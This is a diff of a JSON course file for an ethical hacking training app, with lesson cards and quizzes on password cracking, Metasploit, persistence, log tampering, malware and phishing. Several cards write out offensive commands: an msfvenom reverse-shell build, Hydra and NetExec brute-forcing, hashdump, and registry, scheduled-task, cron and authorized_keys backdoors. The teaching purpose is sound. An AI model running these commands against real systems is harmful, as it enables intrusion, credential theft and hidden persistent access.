+                  "body": "You are the last line of defence technology alone cannot replace — treat every unexpected urgent request with healthy scepticism and keep your personal OSINT footprint minimal. No single control fully stops social engineering; resilience comes from layered, ongoing effort: regular security awareness training, clear blame-free reporting channels, and technical controls like email gateways — combined, not alone."
+                }
+              ],
+              "quiz": {
+                "question": "What is the recommended way to verify an unusual, urgent request (e.g. a wire transfer email from your 'manager')?",
+                "options": [
+                  "Reply immediately to the same email to confirm",
+                  "Verify through a separate, known communication channel, such as calling the person directly",
+                  "Forward it to more people to double check",
+                  "Comply immediately since it claims to be urgent"
+                ],
+                "correct_index": 1,
+                "explanation": "Verifying through a separate, already-trusted channel (like a phone call) prevents an attacker who has spoofed or compromised the original channel from successfully impersonating someone."
+              }
             }
-          ],
-          "quiz": {
-            "question": "Why is a static IP address assigned to the Raspberry Pi in the lab?",
-            "options": [
-              "Static IPs are required by all Linux devices",
-              "So the Pi is always reachable at the same address across lab sessions",
-              "To disable SSH access",
-              "It makes the Pi run Kali Linux faster"
-            ],
-            "correct_index": 1,
-            "explanation": "A static IP keeps the Raspberry Pi reliably reachable at the same address every time, which is essential for consistent lab exercises."
-          }
-        },
-        {
-          "id": "u7_m6_l2",
-          "title": "Lab Checklist & Troubleshooting",
-          "cards": [
-            {
-              "id": "u7_m6_l2_c1",
-              "title": "Lab Setup Checklist",
-              "body": "Before starting exercises, confirm: VMware or VirtualBox installed and working; Kali Linux VM installed, updated, and snapshotted; Windows 7 VM installed as an isolated target; Metasploitable2 VM imported and running; all VMs connected via Bridged network and pinging each other; Metasploit configured with a working database and workspace; Raspberry Pi flashed, given a static IP, and reachable via SSH; clean snapshots taken of every VM."
-            },
-            {
-              "id": "u7_m6_l2_c2",
-              "title": "Common Setup Issues & Command-Line Mistakes",
-              "body": "If VMs can't ping each other, confirm all are set to Bridged mode on the same physical NIC. No internet in Kali? Temporarily switch to NAT for updates, then back to Bridged. If msfconsole shows 'db not connected', restart PostgreSQL and re-run msfdb init. Common command-line mistakes: forgetting 'chmod +x' before running a script, forgetting 'sudo' for admin tasks, and getting stuck in vi (press Esc then type ':q!' to quit without saving)."
-            }
-          ],
-          "quiz": {
-            "question": "What's the fix if 'msfconsole' reports the database is not connected?",
-            "options": [
-              "Reinstall Kali Linux entirely",
-              "Run 'sudo systemctl start postgresql' then 'sudo msfdb init' again",
-              "Switch the network adapter to Host-Only",
-              "Restart the physical router"
-            ],
-            "correct_index": 1,
-            "explanation": "Restarting the PostgreSQL service and reinitialising the Metasploit database resolves the most common 'db not connected' error."
-          }
-        },
-        {
-          "id": "u7_m6_l3",
-          "title": "Ethics & Key Takeaways",
-          "cards": [
-            {
-              "id": "u7_m6_l3_c1",
-              "title": "Legal & Ethical Boundaries",
-              "body": "Every tool and technique in this course must only be used inside your own isolated/bridged lab. Scanning, exploiting, or accessing any system without explicit written authorisation is illegal in India and most countries. Bridged networking makes your VMs visible on the wider LAN — never point scans or exploits at other devices on that network. Real-world engagements always begin with a signed scope-of-work and rules of engagement document. When in doubt, don't run it — ask an instructor first."
-            },
-            {
-              "id": "u7_m6_l3_c2",
-              "title": "Key Takeaways",
-              "body": "VMware and VirtualBox both provide everything needed to build a professional-grade lab. Bridged networking gives every VM its own IP, letting Kali, Windows 7, Metasploitable2, and the Pi interact like real hardware. Metasploitable2 is deliberately vulnerable and must never be exposed beyond the lab. Metasploit, backed by a working PostgreSQL database, is the central exploitation framework used throughout. Snapshots are what make fearless, repeatable practice possible."
-            }
-          ],
-          "quiz": {
-            "question": "Since bridged networking makes lab VMs visible on the wider LAN, what is the correct practice?",
-            "options": [
-              "Scan any device you can see on the network for practice",
-              "Never point scans or exploits at devices outside your defined lab scope",
-              "Bridged mode is always safe to use on public Wi-Fi",
-              "Ask forgiveness later if you accidentally scan a neighbor's device"
-            ],
-            "correct_index": 1,
-            "explanation": "Because bridged VMs are visible on the real LAN, scanning or exploiting anything outside your own authorised lab machines is illegal and unethical."
-          }
+          ]
         }
       ]
     }
-  ]
-},
-{
-  "id": "unit_09",
-  "title": "Unit 9: Gaining Access, Maintaining Access, Covering Tracks & Social Engineering",
-  "description": "Completing the ethical hacking lifecycle — exploitation, password cracking, Metasploit, persistence, anti-forensics, malware, and social engineering awareness.",
-  "modules": [
-    {
-      "id": "u9_m1",
-      "title": "Gaining Access: Exploits & Password Cracking",
-      "description": "Turning a discovered vulnerability into real, working access.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u9_m1_l1",
-          "title": "What is Gaining Access?",
-          "cards": [
-            {
-              "id": "u9_m1_l1_c1",
-              "title": "The Third Phase",
-              "body": "Gaining Access is the third phase of ethical hacking — actually exploiting a discovered vulnerability to enter a system. It builds directly on the Scanning phase's findings and is the point where a test moves from 'what's exposed' to 'what can actually be exploited'. Success proves a vulnerability is real, not just theoretical. It's the most legally sensitive phase — always requires explicit, written authorisation."
-            },
-            {
-              "id": "u9_m1_l1_c2",
-              "title": "Types of Exploits",
-              "body": "Remote Exploit: attacks a vulnerability over a network without prior access. Local Exploit: requires existing limited access, used to escalate privileges. Client-Side Exploit: targets vulnerabilities in client applications (browsers, PDF readers) via user interaction. Server-Side Exploit: directly targets a vulnerable service running on a server."
-            },
-            {
-              "id": "u9_m1_l1_c3",
-              "title": "From Vulnerability to Access",
-              "body": "The typical flow: 1. Vulnerability Found (Scanning identifies a weakness). 2. Select Exploit (choose a matching exploit/technique). 3. Configure Payload (prepare what runs after access is gained). 4. Launch Exploit (execute against the authorised target). 5. Access Gained (a session/shell on the target is established)."
-            }
-          ],
-          "quiz": {
-            "question": "What is the key difference between a Remote Exploit and a Local Exploit?",
-            "options": [
-              "Remote exploits only work on web browsers",
-              "A Remote Exploit attacks over the network without prior access; a Local Exploit requires existing limited access to escalate privileges",
-              "There is no difference",
-              "Local exploits only target servers"
-            ],
-            "correct_index": 1,
-            "explanation": "Remote exploits gain initial access from outside the system, while local exploits are used to escalate privileges once some access already exists."
-          }
-        },
-        {
-          "id": "u9_m1_l2",
-          "title": "Password Cracking Fundamentals",
-          "cards": [
-            {
-              "id": "u9_m1_l2_c1",
-              "title": "Password Cracking Overview & Techniques",
-              "body": "Password cracking recovers passwords from stored or captured data — often the weakest link. Techniques: Brute Force (systematically tries every character combination), Dictionary Attack (tries common words and known leaked passwords), Rainbow Table Attack (uses precomputed hash tables to reverse-lookup a password), and Hybrid Attack (combines dictionary words with common variations like added numbers/symbols)."
-            },
-            {
-              "id": "u9_m1_l2_c2",
-              "title": "Online vs Offline Password Attacks",
-              "body": "Online attacks target a live login service (e.g. SSH, web login) — slower, limited by network and lockout policies, and often logged (example tool: Hydra). Offline attacks target a stolen/captured password hash file — much faster, limited only by computing power, and invisible to the target once the hash is obtained (example tools: John the Ripper, Hashcat)."
-            }
-          ],
-          "quiz": {
-            "question": "Why are offline password attacks generally faster than online attacks?",
-            "options": [
-              "Offline attacks use less electricity",
-              "Offline attacks are limited only by computing power, not by network speed or account lockout policies",
-              "Online attacks always use stronger encryption",
-              "There's no actual speed difference"
-            ],
-            "correct_index": 1,
-            "explanation": "Offline attacks work against a captured hash file locally, so they aren't slowed by network latency or protected by account lockout mechanisms the way online attacks against a live service are."
-          }
-        },
-        {
-          "id": "u9_m1_l3",
-          "title": "Password Cracking Tools",
-          "cards": [
-            {
-              "id": "u9_m1_l3_c1",
-              "title": "John the Ripper",
-              "body": "A versatile offline password cracker supporting many hash formats. 'john hashes.txt' cracks using default settings. 'john --wordlist=rockyou.txt hashes.txt' runs a dictionary attack. 'john --show hashes.txt' displays already-cracked passwords. 'john --incremental hashes.txt' runs a full brute-force. Format flags like '--format=nt' (Windows NTLM) or '--format=bcrypt' target specific hash types."
-            },
-            {
-              "id": "u9_m1_l3_c2",
-              "title": "Hashcat",
-              "body": "An extremely fast, GPU-accelerated password recovery tool. Attack modes: -a 0 (straight dictionary attack), -a 1 (combination of two wordlists), -a 3 (brute-force/mask attack), -a 6/-a 7 (hybrid wordlist+mask combinations). Example: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt' runs a dictionary attack against MD5 hashes (mode 0)."
-            },
-            {
-              "id": "u9_m1_l3_c3",
-              "title": "Hydra & Alternative Brute-Force Tools",
-              "body": "Hydra is an online password-guessing tool: 'hydra -l admin -P rockyou.txt ssh://192.168.1.10' brute-forces an SSH login. Medusa is a fast, parallel, modular alternative supporting many services. Ncrack, built by the Nmap team, focuses on network authentication testing at scale and integrates naturally with Nmap output. CrackMapExec/NetExec tests credentials across entire subnets, e.g. 'nxc smb 192.168.1.0/24 -u admin -p Password123'."
-            }
-          ],
-          "quiz": {
-            "question": "Which tool is specifically designed for GPU-accelerated offline password cracking?",
-            "options": [
-              "Hydra",
-              "Hashcat",
-              "WHOIS",
-              "Wireshark"
-            ],
-            "correct_index": 1,
-            "explanation": "Hashcat is built to leverage GPU acceleration, making it extremely fast for offline hash cracking compared to CPU-based tools."
-          }
-        },
-        {
-          "id": "u9_m1_l4",
-          "title": "Rainbow Tables & Ethical Boundaries",
-          "cards": [
-            {
-              "id": "u9_m1_l4_c1",
-              "title": "Ophcrack & Rainbow Tables",
-              "body": "Ophcrack is a free tool specialised in cracking Windows passwords using precomputed rainbow tables, which trade disk space for speed by avoiding repeated hash computation. It comes with free tables for older LM hashes, with larger tables available for purchase. Modern Windows systems (NTLM with salting-like protections) are far more resistant than legacy LM hashes — salting is why rainbow table attacks are largely defeated on modern systems."
-            },
-            {
-              "id": "u9_m1_l4_c2",
-              "title": "Password Cracking — Ethical Use & Legal Boundaries",
-              "body": "Legitimate use is auditing your own organisation's password strength with proper authorisation. Cracking passwords you don't own or lack permission to test is a criminal offence. Even in authorised tests, cracked passwords must be handled confidentially. Practice only against your own accounts or designated lab material — this is exactly why strong, unique passwords matter so much."
-            }
-          ],
-          "quiz": {
-            "question": "Why are rainbow table attacks largely defeated on modern Windows systems?",
-            "options": [
-              "Modern Windows doesn't use passwords at all",
-              "Salting-like protections on NTLM make precomputed tables far less effective than on legacy LM hashes",
-              "Rainbow tables no longer exist",
-              "Windows blocks all password cracking tools automatically"
-            ],
-            "correct_index": 1,
-            "explanation": "Salting adds unique data to each password before hashing, which defeats the whole point of a precomputed rainbow table lookup."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u9_m2",
-      "title": "Gaining Access: Metasploit & Exploitation Tools",
-      "description": "Using the industry-standard exploitation framework and its supporting tools.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u9_m2_l1",
-          "title": "Metasploit Deep Dive",
-          "cards": [
-            {
-              "id": "u9_m2_l1_c1",
-              "title": "Core Components",
-              "body": "Exploit: code that takes advantage of a specific vulnerability. Payload: code that runs on the target after successful exploitation. Auxiliary Module: supporting functions like scanning, fuzzing, or denial-of-service testing. Encoder: helps a payload avoid detection by security tools, used carefully and ethically."
-            },
-            {
-              "id": "u9_m2_l1_c2",
-              "title": "Payloads & Meterpreter",
-              "body": "A payload defines what happens once an exploit succeeds — from a simple command shell to full control. Meterpreter is Metasploit's advanced payload: an interactive, in-memory post-exploitation tool allowing file system navigation, screenshots, and system information gathering. It runs entirely in memory, making it harder to detect than traditional disk-based payloads."
-            },
-            {
-              "id": "u9_m2_l1_c3",
-              "title": "A Sample Metasploit Workflow",
-              "body": "1. search — find a module for the known vulnerability. 2. use — select the exploit module. 3. set RHOSTS — configure the authorised target IP. 4. set PAYLOAD — choose what runs after exploitation. 5. exploit — launch against the authorised lab target."
-            }
-          ],
-          "quiz": {
-            "question": "Why is Meterpreter considered harder to detect than a traditional payload?",
-            "options": [
-              "It uses a different color scheme",
-              "It runs entirely in memory rather than being written to disk",
-              "It doesn't communicate with the attacker at all",
-              "It only works on Linux"
-            ],
-            "correct_index": 1,
-            "explanation": "Because Meterpreter operates in-memory rather than writing files to disk, it leaves fewer traditional forensic traces for antivirus and disk-scanning tools to catch."
-          }
-        },
-        {
-          "id": "u9_m2_l2",
-          "title": "msfconsole & Meterpreter Commands",
-          "cards": [
-            {
-              "id": "u9_m2_l2_c1",
-              "title": "msfconsole Essentials",
-              "body": "'search type:exploit platform:windows smb' searches for matching exploit modules. 'use exploit/windows/smb/ms17_010_eternalblue' selects a specific module. 'show options' lists all configurable options for the selected module. 'set RHOSTS 192.168.1.20' sets the target host. 'info' displays detailed information about the current module."
-            },
-            {
-              "id": "u9_m2_l2_c2",
-              "title": "Meterpreter Commands & Post-Exploitation Workflow",
-              "body": "'sysinfo' displays basic target system info. 'getuid' shows the current privilege context. 'ps' lists running processes (for migration). 'screenshot' captures the target's desktop. 'hashdump' dumps password hashes for offline cracking. Typical workflow: sysinfo → getuid → ps/migrate → hashdump → download/upload files."
-            }
-          ],
-          "quiz": {
-            "question": "Which Meterpreter command would you run to extract password hashes for later offline cracking?",
-            "options": [
-              "sysinfo",
-              "screenshot",
-              "hashdump",
-              "getuid"
-            ],
-            "correct_index": 2,
-            "explanation": "'hashdump' extracts password hashes stored on the compromised target, which can then be cracked offline with tools like John the Ripper or Hashcat."
-          }
-        },
-        {
-          "id": "u9_m2_l3",
-          "title": "msfvenom, Resource Scripts & Armitage",
-          "cards": [
-            {
-              "id": "u9_m2_l3_c1",
-              "title": "msfvenom — Generating Custom Payloads",
-              "body": "msfvenom generates standalone payloads. 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe' generates a Windows reverse-shell executable. Similar commands generate Linux ELF binaries or PHP web-shells by changing the payload and format flags."
-            },
-            {
-              "id": "u9_m2_l3_c2",
-              "title": "Resource Scripts & Armitage",
-              "body": "Resource scripts (.rc files) contain a sequence of msfconsole commands to run automatically — launch with 'msfconsole -r myscript.rc' to replay an entire exploitation sequence instantly, useful for repeatable lab exercises. Armitage is a graphical front-end for Metasploit that visualises targets and available attacks as icons, useful for teaching, though most professionals still work primarily in msfconsole."
-            }
-          ],
-          "quiz": {
-            "question": "What is the purpose of an msfconsole resource script (.rc file)?",
-            "options": [
-              "To store captured passwords",
-              "To replay a sequence of msfconsole commands automatically, standardising a repeatable workflow",
-              "To encrypt Meterpreter traffic",
-              "To generate wordlists"
-            ],
-            "correct_index": 1,
-            "explanation": "Resource scripts turn a manual, multi-step process into a single, repeatable, auditable command sequence — useful for demos and consistent testing."
-          }
-        },
-        {
-          "id": "u9_m2_l4",
-          "title": "Real-World Exploits & Other Tools",
-          "cards": [
-            {
-              "id": "u9_m2_l4_c1",
-              "title": "EternalBlue & Privilege Escalation",
-              "body": "EternalBlue (MS17-010) was a famous Windows SMB vulnerability exploited in the 2017 WannaCry ransomware outbreak, allowing remote code execution without user interaction. Once initial access is gained, attackers often only have limited privileges — Privilege Escalation is the process of gaining higher-level access. Vertical escalation moves from low to high privilege; horizontal escalation gains access to another account at the same privilege level."
-            },
-            {
-              "id": "u9_m2_l4_c2",
-              "title": "SQLmap, BeEF, Searchsploit & Netcat",
-              "body": "SQLmap automates detecting and exploiting SQL injection: 'sqlmap -u \"http://target/page?id=1\" --dbs' lists databases once injection is confirmed. BeEF (Browser Exploitation Framework) exploits web browsers via a 'hooked' JavaScript payload after an XSS flaw. Searchsploit searches a local Exploit-DB copy: 'searchsploit apache 2.4'. Netcat creates reverse/bind shells: 'nc -lvnp 4444' listens for an incoming connection."
-            }
-          ],
-          "quiz": {
-            "question": "What made EternalBlue (MS17-010) especially dangerous?",
-            "options": [
-              "It required the victim to open a phishing email",
-              "It allowed remote code execution on unpatched Windows systems without any user interaction",
-              "It only worked on Linux servers",
-              "It was never actually exploited in the wild"
-            ],
-            "correct_index": 1,
-            "explanation": "EternalBlue allowed attackers to remotely execute code on vulnerable, unpatched Windows systems with zero user interaction required, which is why it spread so devastatingly fast in the WannaCry outbreak."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u9_m3",
-      "title": "Maintaining Access: Backdoors & Persistence",
-      "description": "How attackers ensure access survives reboots and time — and how defenders detect it.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u9_m3_l1",
-          "title": "Backdoors & Why Attackers Persist",
-          "cards": [
-            {
-              "id": "u9_m3_l1_c1",
-              "title": "What is Maintaining Access?",
-              "body": "The fourth phase of ethical hacking — ensuring continued access to a compromised system over time. Without persistence, access could be lost the moment the system reboots or a session drops. Re-exploiting a vulnerability every time is slow, noisy, and may not always work again — persistence enables longer-term objectives like data exfiltration, espionage, or ransomware deployment. Advanced Persistent Threats (APTs) rely heavily on long-term persistence."
-            },
-            {
-              "id": "u9_m3_l1_c2",
-              "title": "Types of Backdoors",
-              "body": "A backdoor is a hidden method of bypassing normal authentication. Software Backdoor: a hidden program or modified application providing covert remote access. Web Shell: a malicious script uploaded to a web server, providing command execution via a browser. Hardware Backdoor: a physical device or firmware modification. Account Backdoor: a hidden or additional user account created for repeated authorised-looking access."
-            }
-          ],
-          "quiz": {
-            "question": "Why do attackers seek persistence rather than just re-exploiting a vulnerability each time?",
-            "options": [
-              "Re-exploitation is illegal but persistence is legal",
-              "Re-exploiting is slow, noisy, and may not always work again — persistence enables continued access without repeating the entire attack",
-              "Persistence is required by the vulnerability itself",
-              "There is no advantage to persistence"
-            ],
-            "correct_index": 1,
-            "explanation": "Persistence lets an attacker skip the risky, noisy re-exploitation step and instead maintain reliable ongoing access for longer-term objectives."
-          }
-        },
-        {
-          "id": "u9_m3_l2",
-          "title": "Persistence Techniques",
-          "cards": [
-            {
-              "id": "u9_m3_l2_c1",
-              "title": "Common Persistence Techniques",
-              "body": "Startup/Registry Entries: adds a program to run automatically at boot (Windows Run keys). Scheduled Tasks/Cron Jobs: configures the OS to periodically re-launch malicious code. Malicious Services: installs a disguised service running continuously in the background. SSH Key Injection: adds an attacker's SSH key to authorized_keys for passwordless remote access."
-            },
-            {
-              "id": "u9_m3_l2_c2",
-              "title": "Concrete Persistence Commands",
-              "body": "Windows: 'reg add HKCU\\...\\Run /v Update /t REG_SZ /d C:\\payload.exe' adds a registry Run key; 'schtasks /create /tn Update /tr payload.exe /sc onlogon' creates a scheduled task at logon. Linux: 'crontab -e' with '@reboot /path/payload.sh' runs a script every reboot; 'echo \"attacker_key\" >> ~/.ssh/authorized_keys' adds a passwordless SSH key; 'systemctl enable malicious.service' registers a disguised auto-starting service."
-            }
-          ],
-          "quiz": {
-            "question": "Which Linux persistence technique allows an attacker passwordless remote login?",
-            "options": [
-              "Editing /etc/hostname",
-              "Adding the attacker's public key to ~/.ssh/authorized_keys",
-              "Running 'ls -la'",
-              "Installing a browser extension"
-            ],
-            "correct_index": 1,
-            "explanation": "Appending an attacker's SSH public key to authorized_keys grants them passwordless SSH access to the system from then on."
-          }
-        },
-        {
-          "id": "u9_m3_l3",
-          "title": "Rootkits, C2 & Advanced Persistence Tools",
-          "cards": [
-            {
-              "id": "u9_m3_l3_c1",
-              "title": "Rootkits & Command and Control",
-              "body": "Rootkits are stealthy malware hiding deep within the operating system, actively concealing the attacker's presence — hiding files, processes, network connections, and even other persistence mechanisms. Kernel-level rootkits operate below where most security tools look. A Command & Control (C2) channel lets an attacker remotely control a compromised system; compromised machines periodically 'call home' to a C2 server, and modern C2 traffic often disguises itself as normal web traffic."
-            },
-            {
-              "id": "u9_m3_l3_c2",
-              "title": "Netcat, Weevely & Post-Exploitation Frameworks",
-              "body": "A simple netcat listener combined with a scheduled task creates a basic persistent backdoor, though it's easy to detect once known. Weevely generates a stealthy, obfuscated PHP web shell communicating over standard HTTP requests. Post-exploitation frameworks like PowerShell Empire, Covenant, and Sliver offer more advanced, disguised persistence and C2 capabilities — Cobalt Strike is the commercial, professional-grade option widely used in red teaming."
-            }
-          ],
-          "quiz": {
-            "question": "What is the main purpose of a Command & Control (C2) channel?",
-            "options": [
-              "To encrypt files for ransom",
-              "To let an attacker remotely direct a compromised system after it 'calls home'",
-              "To scan for open ports",
-              "To perform a WHOIS lookup"
-            ],
-            "correct_index": 1,
-            "explanation": "A C2 channel is the attacker's remote control mechanism, letting them issue new instructions to compromised machines that periodically check in."
-          }
-        },
-        {
-          "id": "u9_m3_l4",
-          "title": "Detecting Persistence & Ethics",
-          "cards": [
-            {
-              "id": "u9_m3_l4_c1",
-              "title": "Detecting Persistence & Backdoors",
-              "body": "Defenders should regularly audit startup entries, scheduled tasks, and running services for anything unfamiliar. Tools include Autoruns (Sysinternals) which lists every program configured to start automatically on Windows, chkrootkit/rkhunter which scan Linux systems for known rootkit signatures, and network monitoring (Wireshark) to identify unusual outbound connections indicating possible C2 traffic. File Integrity Monitoring and EDR tools also help catch what simple antivirus signatures miss."
-            },
-            {
-              "id": "u9_m3_l4_c2",
-              "title": "Maintaining Access — Ethical Boundaries",
-              "body": "Installing any backdoor or persistence mechanism requires explicit, written authorisation. Authorised tests must document every persistence mechanism installed, for complete removal afterward. Leaving any backdoor in place after a test concludes is a serious professional and legal violation. Professional reports always include full remediation steps for anything installed during testing."
-            }
-          ],
-          "quiz": {
-            "question": "What must a penetration tester do with any backdoor or persistence mechanism installed during an authorised test?",
-            "options": [
-              "Leave it in place for future re-testing",
-              "Fully document it and remove it after the test concludes",
-              "Sell it to the highest bidder",
-              "Nothing — it's not their responsibility"
-            ],
-            "correct_index": 1,
-            "explanation": "Leaving any installed backdoor in place after a test is a serious legal and professional violation — everything must be documented and removed."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u9_m4",
-      "title": "Covering Tracks",
-      "description": "The final phase — how attackers erase evidence, and why logging must be tamper-resistant.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u9_m4_l1",
-          "title": "What is Covering Tracks?",
-          "cards": [
-            {
-              "id": "u9_m4_l1_c1",
-              "title": "The Final Phase",
-              "body": "Covering Tracks is the fifth and final phase of the ethical hacking lifecycle — erasing evidence of an intrusion. Attackers attempt to remove or alter logs, files, and other traces of their activity, with the goal of avoiding detection and making forensic investigation as difficult as possible. This directly opposes the Integrity and Non-Repudiation principles — this is where they're tested."
-            },
-            {
-              "id": "u9_m4_l1_c2",
-              "title": "Why Attackers Cover Their Tracks",
-              "body": "Extends the duration of undetected access, maximising time for the attacker's objectives. Makes incident response and forensic investigation slower and less conclusive. Can obscure the true scope of a breach, and complicates attribution — making it harder to identify who was responsible. A hallmark of sophisticated, patient attackers rather than opportunistic ones."
-            }
-          ],
-          "quiz": {
-            "question": "Which security principles does Covering Tracks most directly attack?",
-            "options": [
-              "Availability and Confidentiality",
-              "Integrity and Non-Repudiation",
-              "Authentication and Authorization",
-              "None — it doesn't relate to any security principle"
-            ],
-            "correct_index": 1,
-            "explanation": "Covering Tracks attempts to falsify or erase logs, which directly undermines Integrity (data being accurate/untampered) and Non-Repudiation (proving what actually happened)."
-          }
-        },
-        {
-          "id": "u9_m4_l2",
-          "title": "Log Clearing & Hiding Activities",
-          "cards": [
-            {
-              "id": "u9_m4_l2_c1",
-              "title": "Log Clearing Techniques",
-              "body": "Log clearing involves deleting or modifying system logs to remove evidence. It can target application, system event, authentication, or firewall logs. Complete log deletion is often itself a red flag — investigators notice suspicious gaps. Techniques: Event Log Clearing (deleting Windows Event Viewer or Linux syslog entries), Selective Log Editing (removing only specific entries), Timestomping (altering file timestamps), and Log Rotation Abuse (forcing premature log rotation to push old evidence out of retention)."
-            },
-            {
-              "id": "u9_m4_l2_c2",
-              "title": "Hiding Activities",
-              "body": "Beyond clearing logs, attackers try to hide malicious files and processes themselves, often combined with rootkit techniques. Techniques: Hidden Files/Directories (using OS features like dot-files or the hidden attribute), Alternate Data Streams (hiding data within an NTFS file's alternate stream), Steganography (concealing data within an innocent-looking image), and Process Masquerading (naming malicious processes to resemble legitimate ones)."
-            }
-          ],
-          "quiz": {
-            "question": "Why is a completely empty log file often MORE suspicious to investigators than a normal one?",
-            "options": [
-              "Empty logs are always a sign of good security",
-              "A total absence of expected log entries is itself a red flag indicating deliberate tampering",
-              "Investigators never check log files",
-              "Empty logs mean the system was never used"
-            ],
-            "correct_index": 1,
-            "explanation": "Because logs are expected to contain routine activity, a complete gap or empty file stands out as unusual and often prompts closer investigation."
-          }
-        },
-        {
-          "id": "u9_m4_l3",
-          "title": "Anti-Forensics & Defence",
-          "cards": [
-            {
-              "id": "u9_m4_l3_c1",
-              "title": "Anti-Forensics & Protecting Logs",
-              "body": "Anti-forensics refers to any technique designed to obstruct or mislead a forensic investigation — including log clearing, hiding activity, timestomping, encryption of malicious artifacts, and even planting misleading evidence. Defence: audit logs should be centralised, tamper-evident, and separate from the systems they monitor. Sending logs to a remote, write-restricted SIEM prevents an attacker from editing them locally — 'if logs live only on the compromised system, they were never truly safe to begin with.'"
-            },
-            {
-              "id": "u9_m4_l3_c2",
-              "title": "Covering Tracks — Ethical Boundaries",
-              "body": "Real log tampering, even during an authorised test, requires very explicit prior agreement. Most engagements explicitly PROHIBIT actual log clearing to preserve the client's own audit trail — testers instead document what COULD have been hidden, without actually destroying real evidence. Understanding this phase is about recognition and defence, not about actually erasing anything."
-            }
-          ],
-          "quiz": {
-            "question": "Why does sending logs to a remote, centralised SIEM defend against Covering Tracks?",
-            "options": [
-              "It makes logs load faster",
-              "An attacker who compromises the local system can't edit logs that already live elsewhere and are write-restricted",
-              "SIEMs automatically delete old logs",
-              "It has no defensive value"
-            ],
-            "correct_index": 1,
-            "explanation": "If logs are immediately shipped off to a separate, write-restricted system, an attacker who compromises the local machine can no longer tamper with the evidence already stored elsewhere."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u9_m5",
-      "title": "Malware & Social Engineering",
-      "description": "The software and human techniques that run through every phase of a real attack.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u9_m5_l1",
-          "title": "Malware Across the Attack Lifecycle",
-          "cards": [
-            {
-              "id": "u9_m5_l1_c1",
-              "title": "Malware's Role in Every Phase",
-              "body": "Malware can deliver the exploit (Gaining Access), provide the backdoor (Maintaining Access), or hide itself (Covering Tracks). Malware types map to lifecycle roles: Trojan (often delivers the initial payload), Rootkit (provides stealth during Maintaining Access/Covering Tracks), Ransomware (the final-stage payload, often the ultimate objective), Spyware (gathers information continuously), and Botnet Malware (enables C2 across many devices at once)."
-            },
-            {
-              "id": "u9_m5_l1_c2",
-              "title": "How Malware Spreads",
-              "body": "Email attachments and malicious links remain the most common infection vector. Other vectors: infected removable media (USB drives), drive-by downloads from compromised websites, bundling with pirated or 'free' software, and directly exploiting unpatched vulnerabilities without any user interaction at all. Most malware still needs a human action to begin — which is exactly why awareness matters."
-            }
-          ],
-          "quiz": {
-            "question": "What remains the most common infection vector for malware?",
-            "options": [
-              "Physical hardware failure",
-              "Email attachments and malicious links",
-              "Weather events",
-              "Government intervention"
-            ],
-            "correct_index": 1,
-            "explanation": "Despite advances in technical defences, email attachments and malicious links remain the single most common way malware initially spreads."
-          }
-        },
-        {
-          "id": "u9_m5_l2",
-          "title": "Malware Analysis & Awareness",
-          "cards": [
-            {
-              "id": "u9_m5_l2_c1",
-              "title": "Static vs Dynamic Analysis",
-              "body": "Static Analysis examines the malware's code/file without ever running it — safe, but can miss behaviour only visible at runtime. Dynamic Analysis runs the malware in an isolated 'sandbox' environment and observes its behaviour — more insightful, but requires strict isolation to stay safe."
-            },
-            {
-              "id": "u9_m5_l2_c2",
-              "title": "Signs of Infection & Ransomware",
-              "body": "Warning signs: unusually slow performance or frequent crashes, programs opening/installing without your action, unfamiliar processes or a spike in outbound network activity, antivirus being unexpectedly disabled, and files becoming encrypted or inaccessible without explanation. Ransomware is typically the FINAL payload after all earlier phases have already occurred — modern ransomware often steals data first ('double extortion') before encrypting it. Reliable recovery without payment requires strong, offline backups."
-            }
-          ],
-          "quiz": {
-            "question": "By the time ransomware activates and encrypts files, what has usually already happened?",
-            "options": [
-              "Nothing — ransomware is always the very first step of an attack",
-              "The attacker has typically already completed all five phases of the attack lifecycle",
-              "The victim has already paid the ransom",
-              "The malware has been fully removed"
-            ],
-            "correct_index": 1,
-            "explanation": "Ransomware is usually the final, visible payload — by the time it activates, the attacker has typically already gained access, maintained it, and often covered their tracks."
-          }
-        },
-        {
-          "id": "u9_m5_l3",
-          "title": "Social Engineering Fundamentals",
-          "cards": [
-            {
-              "id": "u9_m5_l3_c1",
-              "title": "What is Social Engineering?",
-              "body": "The art of manipulating people into breaking normal security procedures or revealing information. It exploits human psychology — trust, urgency, fear, curiosity — rather than technical vulnerabilities, and is often the easiest and most reliable way to gain initial access, bypassing technical defences entirely. 'There is no patch for human nature.'"
-            },
-            {
-              "id": "u9_m5_l3_c2",
-              "title": "Common Social Engineering Techniques",
-              "body": "Pretexting: inventing a believable false scenario to extract information (e.g. posing as IT support). Baiting: offering something enticing (free USB, download) that delivers malware when used. Tailgating: physically following an authorised person through a secure door. Quid Pro Quo: offering a fake service or favour in exchange for information or access."
-            }
-          ],
-          "quiz": {
-            "question": "What is 'Tailgating' in social engineering?",
-            "options": [
-              "Sending a fraudulent email",
-              "Physically following an authorised person through a secure door without your own access",
-              "Guessing a password",
-              "Scanning a network for open ports"
-            ],
-            "correct_index": 1,
-            "explanation": "Tailgating is a physical social engineering technique where an attacker follows someone with legitimate access through a secured entry point."
-          }
-        },
-        {
-          "id": "u9_m5_l4",
-          "title": "Phishing Deep Dive",
-          "cards": [
-            {
-              "id": "u9_m5_l4_c1",
-              "title": "Anatomy of a Phishing Email",
-              "body": "Phishing combines urgency, authority, and familiarity to bypass a victim's natural caution, and is the single most common initial access technique in real-world breaches. Key elements: Urgency & Fear ('your account will be suspended in 24 hours'), False Authority (impersonating a bank or official), Deceptive Links (display text hiding a different actual URL), and Lookalike Branding (copying real logos and formatting almost perfectly)."
-            },
-            {
-              "id": "u9_m5_l4_c2",
-              "title": "Spear Phishing vs Mass Phishing",
